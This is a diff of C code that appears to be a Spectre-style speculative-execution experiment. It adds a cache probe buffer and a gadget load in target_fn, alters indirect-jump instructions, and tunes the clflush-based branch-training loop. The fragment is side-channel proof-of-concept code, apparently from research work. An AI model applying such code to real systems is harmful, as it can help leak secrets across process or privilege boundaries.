@@ -9,7 +9,7 @@
 //void funcbar(void) __attribute__((section(".funcbar")));
 
 
-
+uint8_t probe_buf[4096*256];
 /*
  * This is the target of the indirect call
  * which we locate at the address of a gadget
@@ -18,6 +18,9 @@
  */
 void target_fn(void) __attribute__((section(".targetfn")));
 void target_fn(void) {
+    asm volatile ( "movb (%%rbx), %%al\n"
+                    :: "b"((uint8_t*)&probe_buf[190*4096]) : "rax");
+
 }
 
 void __attribute__((section (".fnptr"))) (*fn_ptr)(void); // we'll set this = target_fn, and cflush it
@@ -128,6 +131,10 @@ void indirect(void) {
             "jmpq *%%rax\n"
             "add $6, %%rax\n"
             "jmpq *%%rax\n"
+            "nop\n"
+            "nop\n" // No idea why nops instead of an extra add/jmpq improves ~5%
+            //"add $6, %%rax\n"
+            //"jmpq *%%rax\n"
             :: "a"(0x03), "b"(&jmp_ptr) : "rcx");
 
 
@@ -144,7 +151,7 @@ void train()
         _mm_clflush(fn_ptr);
         _mm_clflush(&jmp_ptr);
         indirect();
-        //usleep(10);
+        //usleep(1);
     }
 }
 
